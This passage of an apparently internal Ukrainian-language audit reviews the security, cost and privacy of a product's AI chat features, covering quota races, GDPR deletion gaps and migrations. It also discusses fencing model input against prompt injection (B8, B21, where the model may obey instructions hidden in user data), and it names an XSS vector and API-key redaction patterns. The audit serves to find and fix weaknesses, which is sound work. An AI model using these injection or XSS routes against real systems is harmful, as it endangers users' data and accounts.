2. Якщо ops колись поставить `LLM_COACH_PROVIDER=anthropic`, тиринг стане
   **повним no-op**: модель завжди `COACH_MODEL_ANTHROPIC`, при тому що
   `resolveProTier` **усе одно спалить** premium/standard-відро квоти.

**Фікс:** передавати tier-модель як `opts.model` теж, а не лише як
OpenRouter-override; або явно вимикати fallback, коли tier ≠ premium.

### B5 — mobile показує ✅ для дій, яких не сталося

[`useChatSend.ts:237-269`](../../../apps/mobile/src/core/hub/useChatSend.ts):
mobile навмисно **не виконує** tool-и (`stubResultText` — «tool execution не
підтримана на мобільному клієнті — дія виконається у web»). Рішення правильне:
краще не виконувати, ніж виконувати наполовину.

Але UI ставить префікс `✅ ${tc.name}` для кожного tool-call-у й будує
`ChatActionCard` із тим самим stub-текстом. Користувач бачить зелену галочку
навпроти «log_weight» — і вважає, що вага записана. Не записана, і не запишеться:
«виконається у web» неправда, бо жодної черги немає.

Це не безпека, це довіра до асистента — і воно системно псує ту саму
властивість, яку `NO_INVENTED_ARGS_RULE` захищає на боці моделі.

**Фікс:** замінити ✅ на нейтральний маркер і зробити текст картки чесним
(«недоступно на мобільному»).

### B6 — mobile шле порожній `context`

[`useChatSend.ts:180-182`](../../../apps/mobile/src/core/hub/useChatSend.ts):
`const context = ""` з позначкою «TODO Phase 8». Тобто мобільний асистент
відповідає **без жодних даних користувача** — при системному промпті, який
наказує «Усі числа бери з блоку ДАНІ». Модель або відмовиться, або вигадає.
Відомий незакритий TODO, але варто знати, що він означає для якості відповідей.

### B7 — маркер довіри в `AnthropicUsage` розходився з ран-таймом (закрито разом із B1)

Тип `AnthropicUsage` не мав поля `cost`, хоча `StreamUsage` у `chatShared.ts`
його має і саме воно доїжджає до `recordUsage` зі стріму. Читач бачив тип без
`cost` і робив висновок, що cost-шлях мертвий — що й сталося при появі гейта з
B1. Поле додано.

### B8 — асиметрія екранування огорож

[`toolOutputWrapping.ts:78, 94`](../../../apps/server/src/modules/chat/toolOutputWrapping.ts):
`</tool_output>` екранується zero-width-символом (`<​/tool_output>`), а
`</user_data>` — HTML-ентіті (`&lt;/user_data&gt;`). Обидва працюють, але
zero-width слабший: модель усе одно бачить послідовність, візуально ідентичну
закривальному тегу, і в теорії може її так і прочитати. Ентіті — однозначні.
Варто звести до одного (сильнішого) варіанта.

### B11 — DLQ AI-пам'яті переживає видалення акаунта

[`migrations/069_ai_memory_ingest_failed.sql:50-61`](../../../apps/server/src/migrations/069_ai_memory_ingest_failed.sql):
`ai_memory_ingest_failed.payload_json` містить **повний текст** пам'яті, а
`user_id` — звичайний `TEXT NOT NULL` без FK і без `ON DELETE CASCADE` (у
`ai_memories` каскад є —
[`025_ai_memories_pgvector.sql:73`](../../../apps/server/src/migrations/025_ai_memories_pgvector.sql)).

Жоден шлях видалення DLQ не чіпає: ні `forgetUser`
([`vectorStore.ts:260-267`](../../../apps/server/src/modules/ai-memory/vectorStore.ts)),
ні `DELETE /api/ai-memory/:id`, ні повне видалення акаунта
([`dataRights.ts:263-274`](../../../apps/server/src/modules/me/dataRights.ts)).
GDPR-експорт ці рядки теж не включає — тобто дані невидимі для суб'єкта.

Гірше: `POST /api/internal/ai-memory-dlq/replay` може **відтворити** видалений
контент назад у `ai_memories` для юзера, якого вже немає.

Ризик тим самим прапорцем відкладений (`AI_MEMORY_ENABLED=false`), але це
пряма GDPR-експозиція, і фіксити її треба разом із B10.

### B12 — очищення пам'яті без tombstone: in-flight ingest повертає стерте

[`clearRoute.ts:16`](../../../apps/server/src/modules/ai-memory/clearRoute.ts)
робить простий `DELETE FROM ai_memories WHERE user_id = $1`. Задачі BullMQ, уже
поставлені в чергу, лежать у Redis і ретраяться з backoff близько 2.5 години
([`ingestQueue.ts:137-146`](../../../apps/server/src/modules/ai-memory/ingestQueue.ts)),
а єдиний гейт воркера — `hasAiMemoryConsent`, який очищення **не перемикає**.

Сценарій: під час інциденту Voyage у юзера 40 задач у черзі; він тисне
«Очистити пам'ять ШІ», бачить порожній список — і за півгодини «видалені» факти
повертаються та знову підмішуються в system-промпт чату.

**Фікс:** epoch/tombstone на юзера, який воркер звіряє перед записом.

### B13 — `forget.ts` і `forgetCleanup.ts` — мертвий код

Grep по всьому репо на `forgetById` / `previewForget` / `confirmForget` /
`runForgetCleanup` дає лише самі ці файли та їхні тести: ні роута, ні крона, ні
експорту з `index.ts`. Тобто задокументований контракт «7 днів recovery-вікна,
потім hard-delete» (`forgetCleanup.ts:11-21` (файл видалено PR #928))
— документація для коду, який не виконується.

Наслідок уже матеріальний: міграція 090 м'яко видалила всі рядки
`source='finyk'` (`deleted_at = NOW()`). Вони приховані від читань, але не
чистяться ніколи — текст ретайрнутих транзакцій лежить у таблиці безстроково.

### B9 — надлишкові резолви сесії на кожен чат-запит

`getSessionUser` викликається щонайменше чотири рази за один `/api/chat`:
`requireSession()` → `chat.ts:281` → `safeSessionUser` у `assertAiQuota` →
`safeSessionUser` у `resolveProTier`. Плюс у `consumeToolQuota` він
викликається **двічі всередині однієї функції** — вдруге лише щоб проставити
лейбл метрики ([`aiQuota.ts:524 і 585`](../../../apps/server/src/modules/chat/aiQuota.ts)),
хоча значення вже є в скоупі. Не безпека — латентність і навантаження на
Better Auth; але рядок 585 виправляється тривіально.

### B30 — `ai_usage_daily` не переживає rollback: у 091 немає `.down.sql`

Знайдено не читанням коду, а розбором червоного CI: `rollback-sanity.test.ts`
падає на `main` і на цій гілці **однаковим** assertion-ом (не флейк — таймаут
тесту 180 с, а падіння настає за ~6 с). Таблиця в діффі — рівно та, про яку
йдеться в B1: DB-леджер витрат на ШІ.

Тест робить `up → всі down.sql у зворотному порядку → переapply` і звіряє
відбиток схеми. Розбіжність — у порядку колонок `ai_usage_daily`:

```text
- Expected (чистий forward)        + Received (після rollback + reapply)
  ...                                ...
  "bucket:text:NO",                  "bucket:text:NO",
                                   + "endpoint:text:YES",
                                   + "cache_read_tokens:bigint:YES",
                                   + "cache_creation_tokens:bigint:YES",
                                   + "actual_cost_usd:numeric:YES",
  "input_tokens:bigint:NO",          "input_tokens:bigint:NO",
  ...                                ...
  "est_cost_usd:numeric:NO",         "est_cost_usd:numeric:NO",
- "endpoint:text:YES",
- "cache_read_tokens:bigint:YES",
- "cache_creation_tokens:bigint:YES",
- "actual_cost_usd:numeric:YES",
```

Причина механічна. Сусідні міграції по цій таблиці мають `.down.sql`
(`012` — токен-лічильники, `036` — `usd_micros`, `059` — `est_cost_usd`), а
`091_ai_usage_endpoint_and_cache.sql` — ні. Тому на down-проході чотири колонки 091 **лишаються**, а `012/036/059`
переapply-яться після них і стають в кінець. Порядок колонок розходиться.

Сам по собі порядок колонок майже нікого не турбує — доки хтось не напише
`INSERT` без списку колонок або не порівняє два `pg_dump`. Але справжня
знахідка інша: **відкотитись за 091 неможливо** — колонки лишаться, і це
асиметрія покриття саме на таблиці обліку витрат.

**Фікс:** додати `.down.sql` із `DROP COLUMN IF EXISTS` на ті ж чотири
колонки. Тоді down-набір стає симетричним, порядок переapply збігається
з forward, і гейт зеленіє. Робота для `sergeant-data-and-migrations`
(Hard Rule #4), не для цього PR — дефект успадкований, у гілці не
змінено жодної міграції.

> **Статус на 2026-08-05: закрито** у PR [#627](https://github.com/SkOrDs-02/sergeant/pull/627).
> Там же розв'язано колізію нумерації 091: міграція переїхала в
> [`104_ai_usage_endpoint_and_cache.sql`](../../../apps/server/src/migrations/104_ai_usage_endpoint_and_cache.sql)
> (перейменування рядка в `migrations`-таблиці — окремою
> [`105_rename_091_ai_usage_endpoint_and_cache.sql`](../../../apps/server/src/migrations/105_rename_091_ai_usage_endpoint_and_cache.sql)),
> і до неї додано парну
> [`104_ai_usage_endpoint_and_cache.down.sql`](../../../apps/server/src/migrations/104_ai_usage_endpoint_and_cache.down.sql).
> Через це старий шлях `091_…sql` більше не існує — посилання вище знято
> навмисно, щоб link-checker не ловив мертвий файл.

## Що підтверджено закритим

Перевірено по коду, а не по описах у попередньому аудиті:

| Знахідка                                            | Стан                | Доказ                                                                                                                                                                                           |
| --------------------------------------------------- | ------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **A1** — `/api/chat` без сесії                      | закрито             | `requireSession()` у ланцюгу [`routes/chat.ts:43`](../../../apps/server/src/routes/chat.ts)                                                                                                     |
| **A2** — сирий клієнтський `context` у `system`     | закрито             | `buildSystem` → `wrapAndScanUserContext` ([`promptCache.ts:134`](../../../apps/server/src/modules/chat/promptCache.ts)); одна точка, тож RAG і coach-кореляції теж під огорожею                 |
| **A4** — немає межі скоупу в промпті                | закрито             | `SCOPE_RULE` у `SYSTEM_PREFIX`, бамп до v17 ([`systemPrompt.ts:149, 187`](../../../apps/server/src/modules/chat/toolDefs/systemPrompt.ts))                                                      |
| **A6** — merge-маркер у `systemPrompt.ts`           | закрито             | маркера немає; версійна історія v6–v17 читається                                                                                                                                                |
| **A9** — `AI_QUOTA_DISABLED` не ловиться на Coolify | **закрито доказом** | `isDeployedProduction()` дивиться на `NODE_ENV` ([`env.ts:706`](../../../apps/server/src/env/env.ts)), а `Dockerfile.api` ставить `ENV NODE_ENV=production` (рядки 106 і 185) — гейт спрацьовує |

## Що тримається (перевірено прицільно)

- **Tool-и виконує клієнт, не сервер.** [`tools.ts:8-10`](../../../apps/server/src/modules/chat/tools.ts).
  Це головна структурна гарантія всього AI-шару: скомпрометована модель не має
  доступу до чужих даних, бо взагалі не має виконавця на сервері.
- **Квота race-free.** `consumeQuota` — атомарний UPSERT з умовою
  `request_count + cost <= limit` у `ON CONFLICT DO UPDATE`
  ([`aiQuota.ts:837-844`](../../../apps/server/src/modules/chat/aiQuota.ts)).
  Два паралельні запити ліміт не перевищать; це не «здається атомарним», це
  справді один рядок під per-row-локом Postgres.
- **Response-cache без крос-юзерного витоку.** Ключ несе `userId` окремим
  сегментом плюс `system` (який і так per-user)
  ([`chatResponseCache.ts:72-91`](../../../apps/server/src/modules/chat/chatResponseCache.ts)).
- **Pro не безлімітний за вартістю.** Попередній аудит рахував стелю Pro як
  «8600 запитів на Sonnet ≈ сотні доларів». Це завищення: `resolveProTier`
  капає **дорогі** тури — 20 premium, далі 80 standard, далі floor
  ([`aiQuota.ts:697-759`](../../../apps/server/src/modules/chat/aiQuota.ts)).
  Кількість не обмежена, вартість — обмежена. A5 лишається відкритою по суті
  (ліміт `null` у `effectiveLimits`), але порядок величини інший.
- **Retry з backoff і повагою до `retry-after` є.** Попередній аудит писав
  «не знайдено — одна спроба». Насправді `anthropicMessagesInner` робить до 3
  спроб на 429/500/502/503/529, читає `retry-after` і
  `anthropic-ratelimit-*-reset`, має ±25% джитера проти thundering herd
  ([`anthropic.ts:316-366, 544-592`](../../../apps/server/src/lib/anthropic.ts)).
  Рядок таблиці durability в попередньому аудиті застарілий.
- **Abort на disconnect.** `req.close` → `clientAbort.abort()` → композиція з
  timeout-сигналом через `AbortSignal.any`; retry-цикл перевіряє
  `externalSignal.aborted` перед кожною спробою.
- **Tool-search не ламає кеш.** `defer_loading` + breakpoint на останньому
  не-deferred інструменті, з явним обґрунтуванням трьох обмежень Anthropic
  ([`toolSearch.ts`](../../../apps/server/src/modules/chat/toolSearch.ts)).
- **Реєстр інструментів валідується на старті** — унікальність імен і cap 20
  strict-tools (інцидент 2026-05-16 не повториться тихо)
  ([`tools.ts:64-106`](../../../apps/server/src/modules/chat/tools.ts)).
- **XSS у рендері відповіді немає.** `dangerouslySetInnerHTML` у чат-шляху
  відсутній; markdown збирається вручну в React-вузли
  ([`AssistantMessageBody.tsx:194-237`](../../../apps/web/src/shared/components/AssistantMessageBody.tsx)),
  тож `<img onerror=…>` від моделі лишається текстом. `javascript:`/`data:`
  заблоковані, картинок у граматиці немає.
- **Жодного AI-ключа в клієнті** й жодного прямого виклику вендора з браузера —
  весь трафік через сервер. Токен авторизації — HttpOnly-кука, не localStorage.
- **RQ-ключі повністю централізовані** (Hard Rule #2 чистий) — усі AI-хуки
  через фабрики, inline-ключів немає.
- **Жоден AI-ключ ніколи не був закомічений.** `git log --all -S"sk-ant-"` дає
  два коміти, обидва — плейсхолдери й фікстури; `-S"sk-or-v1-"` порожньо.
  gitleaks гейтить кожен CI-прогін, усі 23 сторонні actions пришпилені до SHA.
- **У CI взагалі немає AI-секретів** — інвентар `secrets.*` по всіх 28
  воркфлоу не містить жодного Anthropic/OpenAI/OpenRouter/Voyage. Тобто
  вектора «ін'єкція в CI → викрадення ключа» не існує за побудовою.
- **MIME фото визначається магічними байтами**, не заголовком клієнта, з
  відхиленням розбіжності й детекцією SVG/HTML-поліглотів
  ([`imageMagic.ts:79-249`](../../../apps/server/src/lib/imageMagic.ts)).
- **Помилки провайдера не витікають клієнту** — `makeAiProviderError` мапить
  429→503, решту→502, сирий текст лишається лише в `cause` для логів.
- **AI-пам'ять tenant-scoped всюди**: усі запити `WHERE user_id = $1`, схеми
  `.strict()` (підсунути чужий `userId` у тілі не можна), вектор іде
  bound-параметром `$2::halfvec`, IDOR на `DELETE /:id` немає.

## Обмеження цього аудиту

- Статичний аналіз + локальні тести. Жодного запиту до прода.
- Фактичні значення env у проді не звірялися — у документі дефолти з коду.
  Зокрема невідомо, чи ввімкнено `CHAT_VIA_OPENROUTER` (від цього залежить,
  чи B1 діяв у проді, чи лише чекав на вмикання шлюзу).
- `trust proxy` на Coolify не заміряний (успадковано з попередніх аудитів).
- Повний прогін `pnpm check` не робився — hook блокує важкі команди локально
  (політика repo). Прогнано: тести `apps/server/src/modules/chat/**` +
  `lib/anthropic.test.ts` (367 passed), typecheck сервера, ESLint і Prettier на
  змінених файлах.
- Знахідки по чотирьох поверхнях (AI-пам'ять, nutrition/transcribe/digest,
  веб-клієнт, конфіг/CI) зібрані паралельними агентами. Ключові claim-и —
  B21 (усі три ланки), B10 (гейт бюджету, `criticality`, `requirePlan`,
  порядок middleware), B14 (`git grep`), B15/B16 (дефолти) — **переперевірені
  вручну по коду**. Дрібніші Low-знахідки в кожному звіті прийняті як є й
  позначені відповідно; перед фіксом їх варто підтвердити.
- Оцінки серйозності — інженерні, не продуктові. Зокрема B21 подано як
  Critical за структурою ланцюга; фактична ймовірність того, що модель
  послухається інструкції всередині `<user_data>`, не вимірювалась. Це
  вимірний експеримент, і його варто зробити перед пріоритезацією.

## Порядок робіт

Зроблено в цій гілці:

1. **B1** — прибрано гейт `pickAnthropicPricing` у `recordUsage`; `AnthropicUsage`
   отримав `cost` (B7). Два регресійні тести, перевірені на падіння без фікса.
2. **B2** — маска перенесена перед `truncateToolResults`. Регресійний тест
   дивиться на Sentry-breadcrumb, а не на payload.

Лишається. Порядок — за співвідношенням «шкода / вартість фікса», а не за
severity:

**Спершу (структурні дірки, які промпт не закриє):**

3. **B21** — інвертувати `TOOL_RISK`: підтверджувати все, що мутує; звільняти
   явним read-only списком. Мінімум — внести перезаписи (`set_monthly_plan`,
   `set_budget_limit`, `update_budget`) і показувати параметри в діалозі.
   Це єдина знахідка, де шкоду завдає **стороння людина**.
4. **B26** — переписати `assertTranscribeUsdCap` на умовний UPSERT за зразком
   `consumeQuota`. Механічний фікс, зразок лежить у сусідньому файлі.
5. **B25** — обмежити `prior_result` (розмір + форма) у Zod-схемі.
6. **B28** — `inflate: false` у body-парсерах або монтування після авторизації.

**Далі (експлуатація потребує витоку ключа або активації фічі):**

7. **B27** — IP-allowlist і rate-limit на `/api/internal/*`, Zod на
   `categorize`.
8. **B10–B13** — блокери **перед** активацією AI-пам'яті: гейт бюджету в
   `recall`, облік невідомої моделі, каскад для DLQ, tombstone на очищення,
   мертвий `forgetCleanup`.
9. **A5** — увімкнути `ANTHROPIC_BUDGET_HARD_DEGRADE_ALL=true` у проді. Тепер
   це має сенс: до B1 прапорець був декоративним, бо гвард не бачив витрат.

**Гігієна конфігурації (дешево, і саме тут ховаються сюрпризи):**

10. **B14** — підключити або видалити `AI_DAILY_USER_LIMIT`; поки він у
    runbook-у, черговий має хибний важіль.
11. **B15, B16** — fail-closed на битий `AI_QUOTA_TOOL_LIMITS`; сувора
    валідація прапорців витрат за зразком `STRIPE_ENABLED`.
12. **B17, B18, B19, B20** — валідація `AI_QUOTA_FOUNDER_IDS`; `api_key` /
    `openrouterKey` і регекспи `sk-ant-*`/`sk-or-v1-*` у редакції; MCP-пароль
    через `env:`; ключ Anthropic — fail-loud на старті за зразком Voyage.

**Гігієна CI (успадковане з `main`, але тримає гейти червоними):**

13. **B30** — додати `091_ai_usage_endpoint_and_cache.down.sql`. Один файл,
    чотири `DROP COLUMN IF EXISTS` — і `rollback-sanity` перестає падати
    на кожному PR.

**Решта:** B3 (огорожа coach), B4 (tier у `opts.model`), B5/B6 (mobile),
B22 (схеми `remember`/`save_note`), B23, B24, B8, B9, B29.
